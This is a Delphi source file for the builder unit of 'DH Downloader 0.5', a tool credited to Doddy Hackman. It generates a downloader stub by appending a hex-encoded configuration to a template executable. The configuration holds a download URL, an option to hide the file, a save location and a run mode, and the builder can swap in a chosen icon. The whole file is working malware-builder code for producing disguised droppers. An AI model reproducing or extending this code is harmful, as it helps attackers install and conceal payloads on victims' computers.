// DH Downloader 0.5
// (C) Doddy Hackman 2013

unit generate;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, acPNG, ExtCtrls, StdCtrls, sGroupBox, sEdit, ComCtrls, sStatusBar,
  sButton, sCheckBox, sComboBox, sRadioButton, madRes, sPageControl;

type
  TForm4 = class(TForm)
    Image1: TImage;
    sStatusBar1: TsStatusBar;

    OpenDialog1: TOpenDialog;
    sPageControl1: TsPageControl;
    sTabSheet1: TsTabSheet;
    sTabSheet2: TsTabSheet;
    sTabSheet3: TsTabSheet;
    sGroupBox1: TsGroupBox;
    sGroupBox2: TsGroupBox;
    sEdit1: TsEdit;
    sGroupBox3: TsGroupBox;
    sEdit2: TsEdit;
    sGroupBox4: TsGroupBox;
    sRadioButton1: TsRadioButton;
    sRadioButton2: TsRadioButton;
    sGroupBox5: TsGroupBox;
    sGroupBox6: TsGroupBox;
    sGroupBox7: TsGroupBox;
    Image2: TImage;
    sButton1: TsButton;
    sGroupBox8: TsGroupBox;
    sComboBox1: TsComboBox;
    sGroupBox9: TsGroupBox;
    sCheckBox1: TsCheckBox;
    sEdit3: TsEdit;
    sGroupBox10: TsGroupBox;
    sButton2: TsButton;
    procedure sButton1Click(Sender: TObject);
    procedure sEdit2Click(Sender: TObject);
    procedure sButton2Click(Sender: TObject);

    procedure FormCreate(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}
// Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

function getfilename(archivo: string): string;
var
  test: TStrings;
begin

  test := TStringList.Create;
  test.Delimiter := '/';
  test.DelimitedText := archivo;
  Result := test[test.Count - 1];

  test.Free;

end;

//

procedure TForm4.FormCreate(Sender: TObject);
begin

  OpenDialog1.InitialDir := GetCurrentDir;
  OpenDialog1.Filter := 'ICO|*.ico|';

end;

procedure TForm4.sButton2Click(Sender: TObject);
var
  linea: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  marca_uno: string;
  marca_dos: string;
  url: string;
  opcionocultar: string;
  savein: string;
  lineafinal: string;
  stubgenerado: string;
  tipodecarga: string;
  change: DWORD;
  valor: string;

begin

  url := sEdit1.Text;
  stubgenerado := 'tiny_down.exe';

  if (sRadioButton2.Checked = True) then
  begin
    tipodecarga := '1';
  end
  else
  begin
    tipodecarga := '0';
  end;

  if (sCheckBox1.Checked = True) then
  begin
    opcionocultar := '1';
  end
  else
  begin
    opcionocultar := '0';
  end;

  if (sComboBox1.Items[sComboBox1.ItemIndex] = '') then
  begin
    savein := 'USERPROFILE';
  end
  else
  begin
    savein := sComboBox1.Items[sComboBox1.ItemIndex];
  end;

  lineafinal := '[link]' + url + '[link]' + '[opcion]' + opcionocultar +
    '[opcion]' + '[path]' + savein + '[path]' + '[name]' + sEdit2.Text +
    '[name]' + '[carga]' + tipodecarga + '[carga]';

  marca_uno := '[63686175]' + dhencode(lineafinal, 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName)
        + '/' + 'Data/stub_down.exe'), PChar
      (ExtractFilePath(Application.ExeName) + '/' + stubgenerado), True);

  linea := marca_uno;
  StrCopy(code, PChar(linea));
  aca := CreateFile(PChar(stubgenerado), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  //

  if not(sEdit3.Text = '') then
  begin
    try
      begin

        valor := IntToStr(128);

        change := BeginUpdateResourceW
          (PWideChar(wideString(ExtractFilePath(Application.ExeName)
                + '/' + stubgenerado)), False);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(sEdit3.Text)));
        EndUpdateResourceW(change, False);
        sStatusBar1.Panels[0].Text := '[+] Done ';
        sStatusBar1.Update;
      end;
    except
      begin
        sStatusBar1.Panels[0].Text := '[-] Error';
        sStatusBar1.Update;
      end;
    end;
  end
  else
  begin
    sStatusBar1.Panels[0].Text := '[+] Done ';
    sStatusBar1.Update;
  end;

  //

end;

procedure TForm4.sButton1Click(Sender: TObject);
begin

  if OpenDialog1.Execute then
  begin
    Image2.Picture.LoadFromFile(OpenDialog1.FileName);
    sEdit3.Text := OpenDialog1.FileName;
  end;

end;

procedure TForm4.sEdit2Click(Sender: TObject);
begin
  if not(sEdit1.Text = '') then
  begin
    sEdit2.Text := getfilename(sEdit1.Text);
  end;
end;

end.

// The End ?
